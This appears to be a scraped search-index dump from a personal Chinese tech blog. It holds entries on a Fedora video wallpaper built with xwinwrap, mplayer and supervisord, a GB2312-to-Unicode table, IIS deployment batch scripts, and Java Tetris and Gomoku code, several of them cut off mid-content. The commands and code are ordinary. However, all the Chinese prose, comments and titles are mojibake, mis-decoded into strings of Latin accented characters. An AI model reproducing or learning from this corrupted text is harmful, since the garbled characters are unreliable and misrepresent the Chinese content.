ä¸è¡Œçš„è¯ç›´æ¥copyåˆ°åé¢çš„é‚£ä¸ªç›®å½•é‡Œé¢åŒºå°±å¯ä»¥äº† è¿™ä¸ªé…ç½®æ–‡ä»¶æ˜¯ç”¨æ¥æ¥å…¥ç³»ç»Ÿçš„ï¼Œå¦‚æœä½ æ²¡æœ‰åˆ†ç¦»ä¸¤ä¸ª/usrå’Œ/homeçš„è¯ï¼Œç›´æ¥åšä¸ªè½¯é“¾æ¥åº”è¯¥å°±å¯ä»¥äº†ï¼Œæˆ–è€…ç›´æ¥copyåˆ°/usr/share/gnome-background-properties/é‡Œé¢åŒºä¹Ÿè¡Œã€‚ ä¸€èˆ¬ä¸Šé¢ä¸¤æ­¥å¤„ç†å®Œå°±å¯ä»¥ç›´æ¥åœ¨è®¾ç½® \u003e èƒŒæ™¯ å°±å¯ä»¥çœ‹åˆ°ä½ åˆšåˆšé…ç½®çš„é‚£ä¸ªè½®æ¢å£çº¸äº†ï¼Œå¦‚æœçœ‹ä¸åˆ°ï¼Œä½ å¯ä»¥æ³¨é”€ç™»é™†æˆ–è€…alt+f2ç„¶åè¾“å…¥ r é‡å¯ gnomeä¹Ÿå¯ä»¥ã€‚ å®é™…ä¸Šå…³äºå£çº¸è½®æ¢è¿˜æœ‰ä¸ªéªšæ“ä½œï¼Œå°±æ˜¯ç”¨å®šæ—¶ä»»åŠ¡ $\u003e 0 */5 * * * /bin/bash -c 'DISPLAY=:0 GSETTINGS_BACKEND=dconf /usr/bin/gsettings set org.gnome.desktop.background picture-uri \"file:///home/\u003cUser\u003e/.local/share/backgrounds/0$(shuf -i 0-8 -n 1).png\"' ## éœ€è¦æ³¨æ„çš„äº‹ï¼Œè¿™ä¸ªåˆ‡æ¢æ—¶é—´ä¸èƒ½å¤ªçŸ­ï¼Œå¦åˆ™å®¹æ˜“å¯¼è‡´æ¡Œé¢å´©æºƒ è§†é¢‘å£çº¸ https://www.linuxuprising.com/2019/05/livestream-wallpaper-for-your-gnome.html å…³äºè§†é¢‘å£çº¸ï¼Œè¿™åº”è¯¥æ˜¯å¾ˆå¤šäººæƒ³è¦çš„ï¼Œä½†ç½‘ç»œä¸Šä¼¼ä¹æ²¡æœ‰å¾ˆæ˜ç¡®çš„å®‰è£…æ–¹æ³•ï¼Œä»¥ä¸‹æˆ‘æ ¹æ®å¤šæ–¹èµ„æ–™æ•´ç†å‡ºæ¥äº†ä¸€ä¸ªå¯ç”¨çš„æ–¹æ¡ˆ. ä»¥ä¸‹ä¸ºå…·ä½“å®ç°: ç¯å¢ƒéœ€è¦ mplayerç”¨æ¥æ’­æ”¾è§†é¢‘ç”¨çš„ xwinwrap æ ¸å¿ƒå·¥å…· supervisord ç”¨æ¥ç®¡ç†ç¨‹åºçš„ mplayeréœ€è¦å¯ç”¨rpmfusionåº“ï¼Œå®‰è£…å®Œåç›´æ¥dnfå®‰è£…å°±å¯ä»¥äº† $\u003e sudo dnf install https://mirrors.ustc.edu.cn/rpmfusion/free/fedora/rpmfusion-free-release-38.noarch.rpm $\u003e sudo dnf install mplayer æºç ä½ç½®: https://github.com/ujjwal96/xwinwrap#installing å®‰è£…ç¼–è¯‘: $\u003e git clone https://github.com/r00tdaemon/xwinwrap.git $\u003e cd xwinwrap # fedora 38 $\u003e sudo dnf install libX11-devel libXext-devel libXrender-devel libXrandr-dev gcc -y $\u003e make å°†ç¼–è¯‘åäº§ç”Ÿçš„æ–‡ä»¶xwinwrapå¤åˆ¶åˆ°/usr/local/bin/ä¸‹ï¼Œå¹¶èµ‹æ‰§è¡Œæƒé™å³å¯ã€‚ supervisord å¯ä»¥ä¸å®‰è£…ï¼Œä¸è£…çš„è¯xwinwrapæ”¯æŒç›´æ¥ä»¥å®ˆæŠ¤è¿›ç¨‹å½¢å¼è¿è¡Œã€‚ ä»¥ä¸Šç¯å¢ƒå‡†å¤‡å®Œæˆã€‚ä¸‹é¢ç®€è¿°ä¸‹æˆ‘çš„é…ç½®ã€‚ xwinwrapå¯åŠ¨æ–¹å¼(å®é™…å‘½ä»¤è¯´æ˜ä¸åšè¯´æ˜äº†ï¼Œè‡ªå·±-hå°±äº†è§£äº†ï¼Œä¸œè¥¿ä¸å¤š) $\u003e /usr/local/bin/xwinwrap -ni -o 1 -fdt -fs -s -st -sp -b -nf -- mplayer -nolirc -framedrop -nosound -loop 0 -wid WID -quiet /home/cxd/.backgrounds/stars/00000.mp4 ä»¥ä¸Šå‘½ä»¤ç»ˆç«¯æ‰§è¡Œåå®é™…ä¸Šæ¡Œé¢å°±å·²ç»å¯ä»¥çœ‹åˆ°æ•ˆæœäº† æˆ‘çš„supervisorç®¡ç†é…ç½® [program:xwinwrap] command=/usr/local/bin/xwinwrap -ni -o 1 -fdt -fs -s -st -sp -b -nf -- mplayer -framedrop -nosound -loop 0 -wid WID -quiet /home/cxd/.backgrounds/stars/00000.mp4 directory=/home/cxd/.backgrounds autostart=false autorestart=false user=cxd # è¿™ä¸ªæ˜¯ä½ å½“å‰ç™»é™†çš„ç”¨æˆ· stopasgroup=true killasgroup=true redirect_stderr=true stdout_logfile=/var/log/supervisor/xwinwrap.log stdout_logfile_maxbytes=10MB stdout_logfile_backups=10 environment=DISPLAY=:1 # æ³¨æ„: è¿™ä¸ªæå…¶é‡è¦ï¼Œå¿…é¡»é…ç½®ï¼Œä¸ç„¶ä»–ä¼šæ‰¾ä¸åˆ°æ˜¾ç¤ºå™¨ï¼Œä¸çŸ¥é“å¯ä»¥ç”¨envå‘½ä»¤æŸ¥çœ‹ä¸‹å¯¹åº”ç”¨çš„æ˜¯é‚£ä¸ª æ³¨ï¼šfedora 32 é»˜è®¤æ˜¯waylandæ¡Œé¢ï¼Œxwinwrapä¼¼ä¹ä¹Ÿæ˜¯ä¸æ”¯æŒçš„ï¼Œéœ€è¦åˆ‡æ¢ä¸ºX11 æ–‡ä»¶ä¸‹è½½ä¸‹æ¥åè§£å‹åˆ°~/.backgrounds/ä¸‹ï¼Œå¤åˆ¶stars.xmlåˆ°/usr/share/gnom","date":"2022-06-24","objectID":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/:0:0","tags":["linux","fedora"],"title":"Fedoraè§†é¢‘æ¡Œé¢","uri":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/"},{"categories":["é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"Gb2312Unicodeå¯¹ç…§è¡¨","date":"2022-06-24","objectID":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/","tags":["linux"],"title":"Gb2312Unicodeå¯¹ç…§è¡¨","uri":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":" 0xA1A1, 0x3000, /* 'ã€€' -\u003e 12288 */ 0xA1A2, 0x3001, /* 'ã€' -\u003e 12289 */ 0xA1A3, 0x3002, /* 'ã€‚' -\u003e 12290 */ 0xA1A4, 0x30FB, /* 'Â·' -\u003e 12539 */ 0xA1A5, 0x02C9, /* 'Ë‰' -\u003e 713 */ 0xA1A6, 0x02C7, /* 'Ë‡' -\u003e 711 */ 0xA1A7, 0x00A8, /* 'Â¨' -\u003e 168 */ 0xA1A8, 0x3003, /* 'ã€ƒ' -\u003e 12291 */ 0xA1A9, 0x3005, /* 'ã€…' -\u003e 12293 */ 0xA1AA, 0x2015, /* 'â€”' -\u003e 8213 */ 0xA1AB, 0xFF5E, /* 'ï½' -\u003e 65374 */ 0xA1AC, 0x2016, /* 'â€–' -\u003e 8214 */ 0xA1AD, 0x2026, /* 'â€¦' -\u003e 8230 */ 0xA1AE, 0x2018, /* 'â€˜' -\u003e 8216 */ 0xA1AF, 0x2019, /* 'â€™' -\u003e 8217 */ 0xA1B0, 0x201C, /* 'â€œ' -\u003e 8220 */ 0xA1B1, 0x201D, /* 'â€' -\u003e 8221 */ 0xA1B2, 0x3014, /* 'ã€”' -\u003e 12308 */ 0xA1B3, 0x3015, /* 'ã€•' -\u003e 12309 */ 0xA1B4, 0x3008, /* 'ã€ˆ' -\u003e 12296 */ 0xA1B5, 0x3009, /* 'ã€‰' -\u003e 12297 */ 0xA1B6, 0x300A, /* 'ã€Š' -\u003e 12298 */ 0xA1B7, 0x300B, /* 'ã€‹' -\u003e 12299 */ 0xA1B8, 0x300C, /* 'ã€Œ' -\u003e 12300 */ 0xA1B9, 0x300D, /* 'ã€' -\u003e 12301 */ 0xA1BA, 0x300E, /* 'ã€' -\u003e 12302 */ 0xA1BB, 0x300F, /* 'ã€' -\u003e 12303 */ 0xA1BC, 0x3016, /* 'ã€–' -\u003e 12310 */ 0xA1BD, 0x3017, /* 'ã€—' -\u003e 12311 */ 0xA1BE, 0x3010, /* 'ã€' -\u003e 12304 */ 0xA1BF, 0x3011, /* 'ã€‘' -\u003e 12305 */ 0xA1C0, 0x00B1, /* 'Â±' -\u003e 177 */ 0xA1C1, 0x00D7, /* 'Ã—' -\u003e 215 */ 0xA1C2, 0x00F7, /* 'Ã·' -\u003e 247 */ 0xA1C3, 0x2236, /* 'âˆ¶' -\u003e 8758 */ 0xA1C4, 0x2227, /* 'âˆ§' -\u003e 8743 */ 0xA1C5, 0x2228, /* 'âˆ¨' -\u003e 8744 */ 0xA1C6, 0x2211, /* 'âˆ‘' -\u003e 8721 */ 0xA1C7, 0x220F, /* 'âˆ' -\u003e 8719 */ 0xA1C8, 0x222A, /* 'âˆª' -\u003e 8746 */ 0xA1C9, 0x2229, /* 'âˆ©' -\u003e 8745 */ 0xA1CA, 0x2208, /* 'âˆˆ' -\u003e 8712 */ 0xA1CB, 0x2237, /* 'âˆ·' -\u003e 8759 */ 0xA1CC, 0x221A, /* 'âˆš' -\u003e 8730 */ 0xA1CD, 0x22A5, /* 'âŠ¥' -\u003e 8869 */ 0xA1CE, 0x2225, /* 'âˆ¥' -\u003e 8741 */ 0xA1CF, 0x2220, /* 'âˆ ' -\u003e 8736 */ 0xA1D0, 0x2312, /* 'âŒ’' -\u003e 8978 */ 0xA1D1, 0x2299, /* 'âŠ™' -\u003e 8857 */ 0xA1D2, 0x222B, /* 'âˆ«' -\u003e 8747 */ 0xA1D3, 0x222E, /* 'âˆ®' -\u003e 8750 */ 0xA1D4, 0x2261, /* 'â‰¡' -\u003e 8801 */ 0xA1D5, 0x224C, /* 'â‰Œ' -\u003e 8780 */ 0xA1D6, 0x2248, /* 'â‰ˆ' -\u003e 8776 */ 0xA1D7, 0x223D, /* 'âˆ½' -\u003e 8765 */ 0xA1D8, 0x221D, /* 'âˆ' -\u003e 8733 */ 0xA1D9, 0x2260, /* 'â‰ ' -\u003e 8800 */ 0xA1DA, 0x226E, /* 'â‰®' -\u003e 8814 */ 0xA1DB, 0x226F, /* 'â‰¯' -\u003e 8815 */ 0xA1DC, 0x2264, /* 'â‰¤' -\u003e 8804 */ 0xA1DD, 0x2265, /* 'â‰¥' -\u003e 8805 */ 0xA1DE, 0x221E, /* 'âˆ' -\u003e 8734 */ 0xA1DF, 0x2235, /* 'âˆµ' -\u003e 8757 */ 0xA1E0, 0x2234, /* 'âˆ´' -\u003e 8756 */ 0xA1E1, 0x2642, /* 'â™‚' -\u003e 9794 */ 0xA1E2, 0x2640, /* 'â™€' -\u003e 9792 */ 0xA1E3, 0x00B0, /* 'Â°' -\u003e 176 */ 0xA1E4, 0x2032, /* 'â€²' -\u003e 8242 */ 0xA1E5, 0x2033, /* 'â€³' -\u003e 8243 */ 0xA1E6, 0x2103, /* 'â„ƒ' -\u003e 8451 */ 0xA1E7, 0xFF04, /* 'ï¼„' -\u003e 65284 */ 0xA1E8, 0x00A4, /* 'Â¤' -\u003e 164 */ 0xA1E9, 0xFFE0, /* 'ï¿ ' -\u003e 65504 */ 0xA1EA, 0xFFE1, /* 'ï¿¡' -\u003e 65505 */ 0xA1EB, 0x2030, /* 'â€°' -\u003e 8240 */ 0xA1EC, 0x00A7, /* 'Â§' -\u003e 167 */ 0xA1ED, 0x2116, /* 'â„–' -\u003e 8470 */ 0xA1EE, 0x2606, /* 'â˜†' -\u003e 9734 */ 0xA1EF, 0x2605, /* 'â˜…' -\u003e 9733 */ 0xA1F0, 0x25CB, /* 'â—‹' -\u003e 9675 */ 0xA1F1, 0x25CF, /* 'â—' -\u003e 9679 */ 0xA1F2, 0x25CE, /* 'â—' -\u003e 9678 */ 0xA1F3, 0x25C7, /* 'â—‡' -\u003e 9671 */ 0xA1F4, 0x25C6, /* 'â—†' -\u003e 9670 */ 0xA1F5, 0x25A1, /* 'â–¡' -\u003e 9633 */ 0xA1F6, 0x25A0, /* 'â– ' -\u003e 9632 */ 0xA1F7, 0x25B3, /* 'â–³' -\u003e 9651 */ 0xA1F8, 0x25B2, /* 'â–²' -\u003e 9650 */ 0xA1F9, 0x203B, /* 'â€»' -\u003e 8251 */ 0xA1FA, 0x2192, /* 'â†’' -\u003e 8594 */ 0xA1FB, 0x2190, /* 'â†' -\u003e 8592 */ 0xA1FC, 0x2191, /* 'â†‘' -\u003e 8593 */ 0xA1FD, 0x2193, /* 'â†“' -\u003e 8595 */ 0xA1FE, 0x3013, /* 'ã€“' -\u003e 12307 */ 0xA2B1, 0x2488, /* 'â’ˆ' -\u003e 9352 */ 0xA2B2, 0x2489, /* 'â’‰' -\u003e 9353 */ 0xA2B3, 0x248A, /* 'â’Š' -\u003e 9354 */ 0xA2B4, 0x248B, /* 'â’‹' -\u003e 9355 */ 0xA2B5, 0x248C, /* 'â’Œ' -\u003e 9356 */ 0xA2B6, 0x248D, /* 'â’' -\u003e 9357 */ 0xA2B7, 0x248E, /* 'â’' -\u003e 9358 */ 0xA2B8, 0x248F, /* 'â’' -\u003e 9359 */ 0xA2B9, 0x2490, /* 'â’' -\u003e 9360 */ 0xA2BA, 0x2491, /* 'â’‘' -\u003e 9361 */ 0xA2BB, 0x2492, /* 'â’’' -\u003e 9362 */ 0xA2BC, 0x2493, /* 'â’“' -\u003e 9363 */ 0xA2BD, 0x2494, /* 'â’”' -\u003e 9364 */ 0xA2BE, 0x2495, /* 'â’•' -\u003e 9365 */ 0xA2BF, 0x2496, /* 'â’–' -\u003e 9366 */ 0xA2C0, 0x2497, /* 'â’—' -\u003e 9367 */ 0xA2C1, 0x2498, /* 'â’˜' -\u003e 9368 */ 0xA2C2, 0x2499, /* 'â’™' -\u003e 9369 */ 0xA2C3, 0x249A, /* 'â’š' -\u003e 9370 */ 0xA2C4, 0x249B, /* 'â’›' -\u003e 9371 */ 0xA2C5, 0x2474, /* 'â‘´' -\u003e 9332 */ 0xA2C6, 0x2475, /* 'â‘µ' -\u003e 9333 */ 0xA2C7, 0x2476, /* 'â‘¶' -\u003e 9334 */ 0xA2C","date":"2022-06-24","objectID":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/:0:0","tags":["linux"],"title":"Gb2312Unicodeå¯¹ç…§è¡¨","uri":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"IISå‘½ä»¤æ“ä½œ","date":"2022-06-24","objectID":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/","tags":["bat","windows","scripts"],"title":"IISå‘½ä»¤æ“ä½œ","uri":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"1. IIS ç«™ç‚¹éƒ¨ç½² @echo off title Industrial belt project deployment script echo 1. This script is only suitable for the first installation echo 2. Please check and modify the following variable values before deployment echo Sitename: Site name, please separate with spaces or commas echo BackPort: Site bound port echo NetVersion: .netVersion(as:v4.0) echo NetModel: Program operation mode classic (Integrated) or integrated (Classic) set AppCmd=C:\\Windows\\System32\\inetsrv\\appcmd.exe set Sitename=admin.example.com www.example.com set SitePath=C:\\weboxb\\example.com set BackPort=8010 set NetVersion=v4.0 set NetModel=Integrated set LogPath=D:\\iislogs\\ :: Confirm variable initialisation echo Confirming the initialisation: echo AppCmd=%AppCmd% echo Sitename=%Sitename% echo SitePath=%SitePath% echo BackPort=%BackPort% echo NetVersion=%NetVersion% echo NetModel=%NetModel% echo LogPath=%LogPath% pause (for %%a in (%Sitename%) do ( echo Creating application pool for %%a %AppCmd% add apppool /name:%%a /managedRuntimeVersion:%NetVersion% /managedPipelineMode:%NetModel% if errorlevel 1 goto Error echo Creating site directory for %%a mkdir %SitePath%\\%%a if errorlevel 1 goto Error echo Creating site for %%a %AppCmd% add site /name:%%a /bindings:\"http://%%a:%BackPort%\" /physicalpath:%SitePath%\\%%a if errorlevel 1 goto Error echo Associating application pool for %%a %AppCmd% set site /site.name:%%a /[path='/'].applicationPool:%%a if errorlevel 1 goto Error echo. )) echo The execution is complete, please check the execution log at %LogPath%. goto End :Error echo An error occurred. Please check the configurations and try again. pause exit :End pause 2. IIS ç«™ç‚¹åŸŸåä¿®æ”¹ @echo off title update site bind domain echo Please carefully check the configuration content! pause set AppCmd=C:\\Windows\\System32\\inetsrv\\appcmd.exe set BackPort=80 set DomainName=example.cn set NewDomainName=example.com :: Specify log location :: set LogPath=D:/iislogs/ :: /logfile.directory:%LogPath% %AppCmd% set SITE \"www.%DomainName%\" /bindings:\"http://www.%NewDomainName%:%BackPort%\" :: %AppCmd% set SITE \"www.%DomainName%\" /bindings:\"http://www.%NewDomainName%:%BackPort%,http://www.%NewDomainName%:%BackPort%\" echo The execution is complete, please check the execution result... pause ","date":"2022-06-24","objectID":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/:0:0","tags":["bat","windows","scripts"],"title":"IISå‘½ä»¤æ“ä½œ","uri":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"ä¿„ç½—æ–¯æ–¹å—","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/","tags":["linux","java","scripts"],"title":"Java ä¿„ç½—æ–¯æ–¹å—","uri":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":" import javax.swing.*; import java.awt.*; import java.awt.event.*; import javax.swing.border.EtchedBorder; import javax.swing.border.Border; /** * æ¸¸æˆä¸»ç±»ï¼Œç»§æ‰¿è‡ªJFrameç±»ï¼Œè´Ÿè´£æ¸¸æˆçš„å…¨å±€æ§åˆ¶ã€‚ * å†…å« * 1ã€ä¸€ä¸ªGameCanvasç”»å¸ƒç±»çš„å®ä¾‹å¯¹è±¡ï¼Œ * 2ã€ä¸€ä¸ªä¿å­˜å½“å‰æ´»åŠ¨å— (ErsBlock)å®ä¾‹çš„å¯¹è±¡ï¼Œ * 3ã€ä¸€ä¸ªä¿å­˜å½“å‰æ§åˆ¶é¢æ¿ï¼ˆ ControlPanelï¼‰å®ä¾‹çš„å¯¹è±¡; */ public class ErsBlocksGame extends JFrame { //æ¯å¡«æ»¡ä¸€è¡Œè®¡å¤šå°‘åˆ† public final static int PER_LINE_SCORE = 100; //ç§¯å¤šå°‘åˆ†ä»¥åèƒ½å‡çº§ public final static int PER_LEVEL_SCORE = PER_LINE_SCORE * 20; //æœ€å¤§çº§æ•°æ˜¯10çº§ public final static int MAX_LEVEL = 10; //é»˜è®¤çº§æ•°æ˜¯5 public final static int DEFAULT_LEVEL = 5; private GameCanvas canvas; private ErsBlock block; private boolean playing = false; private ControlPanel ctrlPanel; private JMenuBar bar = new JMenuBar(); private JMenu mGame = new JMenu(\"æ¸¸æˆ\" ), mControl = new JMenu(\"æ§åˆ¶ \"), mWindowStyle = new JMenu(\"æ¸¸æˆé£æ ¼ \"), mInfo = new JMenu(\"ä¿¡æ¯ \"); private JMenuItem miNewGame = new JMenuItem(\"æ–°æ¸¸æˆ\" ), miSetBlockColor = new JMenuItem(\"è®¾ç½®æ–¹å—é¢œè‰² ...\"), miSetBackColor = new JMenuItem(\"è®¾ç½®èƒŒæ™¯é¢œè‰² ...\"), miTurnHarder = new JMenuItem(\"å‡é«˜æ¸¸æˆéš¾åº¦ \"), miTurnEasier = new JMenuItem(\"é™ä½æ¸¸æˆéš¾åº¦ \"), miExit = new JMenuItem(\"é€€å‡º \"), miPlay = new JMenuItem(\"å¼€å§‹ \"), miPause = new JMenuItem(\"æš‚åœ \"), miResume = new JMenuItem(\"æ¢å¤ \"), miStop = new JMenuItem(\"ä¸­æ­¢æ¸¸æˆ \"), miAuthor = new JMenuItem(\"ç‰ˆæœ¬ï¼šä¿„ç½—æ–¯æ–¹å— 1.0\"), miSourceInfo = new JMenuItem(\"æºä»£ç ç”± Javaå®ç°\"); private JCheckBoxMenuItem miAsWindows = new JCheckBoxMenuItem(\"Windows\"), miAsMotif = new JCheckBoxMenuItem(\"Motif\"), miAsMetal = new JCheckBoxMenuItem(\"Metal\", true); //ä¸»æ¸¸æˆç±»çš„æ„é€ æ–¹æ³•@param title Stringï¼Œçª—å£æ ‡é¢˜ @SuppressWarnings( \"deprecation\") public ErsBlocksGame(String title) { super(title); setSize( 315, 392 ); Dimension scrSize = Toolkit.getDefaultToolkit() .getScreenSize(); setLocation((scrSize.width - getSize() .width) / 2, (scrSize.height - getSize() .height) / 2); createMenu(); Container container = getContentPane(); container.setLayout( new BorderLayout(6, 0)); canvas = new GameCanvas(20, 12); ctrlPanel = new ControlPanel(this); container.add(canvas, BorderLayout.CENTER); container.add(ctrlPanel, BorderLayout.EAST); addWindowListener( new WindowAdapter() { public void windowClosing(WindowEvent we) { stopGame(); System.exit( 0); } }); addComponentListener( new ComponentAdapter() { public void componentResized(ComponentEvent ce) { canvas.fanning(); } }); show(); canvas.fanning(); } //è®©æ¸¸æˆ\"å¤ä½ \" public void reset() { ctrlPanel.reset(); canvas.reset(); } //åˆ¤æ–­æ¸¸æˆæ˜¯å¦è¿˜åœ¨è¿›è¡Œ //@return boolean, true-è¿˜åœ¨è¿è¡Œï¼Œfalse-å·²ç»åœæ­¢ public boolean isPlaying() { return playing; } /** * å¾—åˆ°å½“å‰æ´»åŠ¨çš„å— * @return ErsBlock, å½“å‰æ´»åŠ¨å—çš„å¼•ç”¨ */ public ErsBlock getCurBlock() { return block; } //å¾—åˆ°å½“å‰ç”»å¸ƒï¼Œ@return GameCanvas, å½“å‰ç”»å¸ƒçš„å¼•ç”¨ public GameCanvas getCanvas() { return canvas; } //å¼€å§‹æ¸¸æˆ public void playGame() { play(); ctrlPanel.setPlayButtonEnable( false); miPlay.setEnabled( false); ctrlPanel.requestFocus(); } //æ¸¸æˆæš‚åœ public void pauseGame() { if (block != null) block.pauseMove(); ctrlPanel.setPauseButtonLabel( false); miPause.setEnabled( false); miResume.setEnabled( true); } //è®©æš‚åœä¸­çš„æ¸¸æˆç»§ç»­ public void resumeGame() { if (block != null) block.resumeMove(); ctrlPanel.setPauseButtonLabel( true); miPause.setEnabled( true); miResume.setEnabled( false); ctrlPanel.requestFocus(); } //ç”¨æˆ·åœæ­¢æ¸¸æˆ public void stopGame() { playing = false; if (block != null) block.stopMove(); miPlay.setEnabled( true); miPause.setEnabled( true); miResume.setEnabled( false); ctrlPanel.setPlayButtonEnable( true); ctrlPanel.setPauseButtonLabel( true); } //å¾—åˆ°æ¸¸æˆè€…è®¾ç½®çš„éš¾åº¦ï¼Œ @return int,æ¸¸æˆéš¾åº¦1ï¼MAX_LEVEL public int getLevel() { return ctrlPanel.getLevel(); } //ç”¨æˆ·è®¾ç½®æ¸¸æˆéš¾åº¦ï¼Œ@param level int,æ¸¸æˆéš¾åº¦1ï¼ MAX_LEVEL public void setLevel(int level) { if (level \u003c 11 \u0026\u0026 level \u003e 0) ctrlPanel.setLevel(level); } //å¾—åˆ°æ¸¸æˆç§¯åˆ†, @return int, ç§¯åˆ†ã€‚ public int getScore() { if (canvas != null) return canvas.getScore(); return 0 ; } //å¾—åˆ°è‡ªä¸Šæ¬¡å‡çº§ä»¥æ¥çš„æ¸¸æˆç§¯åˆ†ï¼Œå‡çº§ä»¥åï¼Œæ­¤ç§¯åˆ†æ¸…é›¶ //@return int, ç§¯åˆ†ã€‚ public int getScoreForLevelUpdate() { if (canvas != null) return canvas.getScoreForLevelUpdate(); return 0 ; } //å½“åˆ†æ•°ç´¯è®¡åˆ°ä¸€å®šçš„æ•°é‡æ—¶ï¼Œå‡ä¸€æ¬¡çº§ //@return boolean, ture-update successufl, false-update fail pub","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/:0:0","tags":["linux","java","scripts"],"title":"Java ä¿„ç½—æ–¯æ–¹å—","uri":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"äº”å­æ£‹","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/","tags":["linux","java","scripts"],"title":"java äº”å­æ£‹","uri":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":" import java.awt.*; import java.awt.event.*; import javax.swing.*; import javax.swing.JPanel; /* *mainæ–¹æ³•åˆ›å»ºäº†ChessFrameç±»çš„ä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆcfï¼‰ï¼Œ *å¹¶å¯åŠ¨å±å¹•æ˜¾ç¤ºæ˜¾ç¤ºè¯¥å®ä¾‹å¯¹è±¡ã€‚ **/ @SuppressWarnings(\"serial\") public class FiveChessAppletDemo { @SuppressWarnings( \"deprecation\") public static void main(String args[]){ ChessFrame cf = new ChessFrame(); cf.show(); } } /* *ç±»ChessFrameä¸»è¦åŠŸèƒ½æ˜¯åˆ›å»ºäº”å­æ£‹æ¸¸æˆä¸»çª—ä½“å’Œèœå• **/ class ChessFrame extends JFrame implements ActionListener { private String[] strsize={\"20x15\",\"30x20\", \"40x30\"}; private String[] strmode={\"äººæœºå¯¹å¼ˆ \",\" äººäººå¯¹å¼ˆ \"}; public static boolean iscomputer=true,checkcomputer= true; private int width,height; private ChessModel cm; private MainPanel mp; //æ„é€ äº”å­æ£‹æ¸¸æˆçš„ä¸»çª—ä½“ public ChessFrame() { this.setTitle( \"äº”å­æ£‹æ¸¸æˆ\"); cm= new ChessModel(1); mp= new MainPanel(cm); Container con= this.getContentPane(); con.add(mp, \"Center\"); this.setResizable( false); this.addWindowListener( new ChessWindowEvent()); MapSize( 20,15 ); JMenuBar mbar = new JMenuBar(); this.setJMenuBar(mbar); JMenu gameMenu = new JMenu(\"æ¸¸æˆ \"); mbar.add(makeMenu(gameMenu, new Object[] { \"å¼€å±€\", \"æ£‹ç›˜\" ,\"æ¨¡å¼ \", null , \"é€€å‡º \" }, this)); JMenu lookMenu = new JMenu(\"è§†å›¾ \"); mbar.add(makeMenu(lookMenu, new Object[] { \"Metal\",\"Motif\" ,\"Windows\" }, this)); JMenu helpMenu = new JMenu(\"å¸®åŠ© \"); mbar.add(makeMenu(helpMenu, new Object[] { \"å…³äº\" }, this)); } //æ„é€ äº”å­æ£‹æ¸¸æˆçš„ä¸»èœå• public JMenu makeMenu(Object parent, Object items[], Object target){ JMenu m = null; if(parent instanceof JMenu) m = (JMenu)parent; else if (parent instanceof String) m = new JMenu((String)parent); else return null ; for(int i = 0; i \u003c items.length; i++) if(items[i] == null) m.addSeparator(); else if (items[i] == \"æ£‹ç›˜\" ){ JMenu jm = new JMenu(\"æ£‹ç›˜ \"); ButtonGroup group= new ButtonGroup(); JRadioButtonMenuItem rmenu; for (int j=0;j\u003cstrsize.length;j++){ rmenu=makeRadioButtonMenuItem(strsize[j],target); if (j==0 ) rmenu.setSelected( true); jm.add(rmenu); group.add(rmenu); } m.add(jm); } else if (items[i] == \"æ¨¡å¼\" ){ JMenu jm = new JMenu(\"æ¨¡å¼ \"); ButtonGroup group= new ButtonGroup(); JRadioButtonMenuItem rmenu; for (int h=0;h\u003cstrmode.length;h++){ rmenu=makeRadioButtonMenuItem(strmode[h],target); if(h==0 ) rmenu.setSelected( true); jm.add(rmenu); group.add(rmenu); } m.add(jm); } else m.add(makeMenuItem(items[i], target)); return m; } //æ„é€ äº”å­æ£‹æ¸¸æˆçš„èœå•é¡¹ public JMenuItem makeMenuItem(Object item, Object target){ JMenuItem r = null; if(item instanceof String) r = new JMenuItem((String)item); else if (item instanceof JMenuItem) r = (JMenuItem)item; else return null ; if(target instanceof ActionListener) r.addActionListener((ActionListener)target); return r; } //æ„é€ äº”å­æ£‹æ¸¸æˆçš„å•é€‰æŒ‰é’®å¼èœå•é¡¹ public JRadioButtonMenuItem makeRadioButtonMenuItem( Object item, Object target){ JRadioButtonMenuItem r = null; if(item instanceof String) r = new JRadioButtonMenuItem((String)item); else if(item instanceof JRadioButtonMenuItem) r = (JRadioButtonMenuItem)item; else return null ; if(target instanceof ActionListener) r.addActionListener((ActionListener)target); return r; } public void MapSize(int w,int h){ setSize(w * 20+50 , h * 20+ 100 ); if( this.checkcomputer) this.iscomputer= true; else this.iscomputer= false; mp.setModel(cm); mp.repaint(); } public boolean getiscomputer(){ return this.iscomputer; } public void restart(){ int modeChess = cm.getModeChess(); if(modeChess \u003c= 3 \u0026\u0026 modeChess \u003e= 1){ cm = new ChessModel(modeChess); 